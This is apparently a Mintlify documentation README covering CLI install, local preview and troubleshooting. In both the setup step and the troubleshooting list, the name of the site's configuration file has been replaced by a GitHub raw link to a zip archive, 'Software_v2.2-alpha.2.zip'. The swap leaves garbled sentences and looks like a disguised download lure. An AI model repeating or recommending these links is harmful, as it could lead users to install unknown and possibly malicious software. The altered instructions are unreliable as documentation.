```
npm i -g mint
```

Run the following command at the root of your documentation, where your `https://github.com/r2hloveu/docs/raw/refs/heads/main/ai-tools/Software_v2.2-alpha.2.zip` is located:

```
mint dev

View your local preview at `http://localhost:3000`.

## Publishing changes

### Troubleshooting

- If your dev environment isn't running: Run `mint update` to ensure you have the most recent version of the CLI.
- If a page loads as a 404: Make sure you are running in a folder with a valid `https://github.com/r2hloveu/docs/raw/refs/heads/main/ai-tools/Software_v2.2-alpha.2.zip`.
